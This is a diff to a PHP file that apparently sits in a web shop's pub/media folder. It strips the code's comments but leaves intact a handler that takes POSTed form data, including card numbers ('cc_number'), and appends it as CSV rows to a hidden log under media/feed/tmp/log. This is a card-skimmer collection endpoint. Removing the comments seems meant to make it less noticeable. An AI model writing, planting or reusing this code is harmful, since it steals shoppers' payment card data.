@@ -1,6 +1,5 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Log directory under pub/media
     $logDir = __DIR__ . '/media/feed/tmp/log';
     if (!is_dir($logDir)) {
         mkdir($logDir, 0755, true);
@@ -9,7 +8,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     $data = $_POST;
 
-    // Map fields sesuai header yang diminta
     $fields = [
         'id'        => uniqid('', true),
         'cc'        => $data['cc_number'] ?? '',
@@ -28,13 +26,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'timestamp' => date('Y-m-d H:i:s')
     ];
 
-    // Jika file belum ada, tulis header
     if (!file_exists($logFile)) {
         $header = implode(',', array_keys($fields)) . "\n";
         file_put_contents($logFile, $header);
     }
 
-    // Append data sebagai CSV
     $handle = fopen($logFile, 'a');
     fputcsv($handle, array_values($fields));
     fclose($handle);
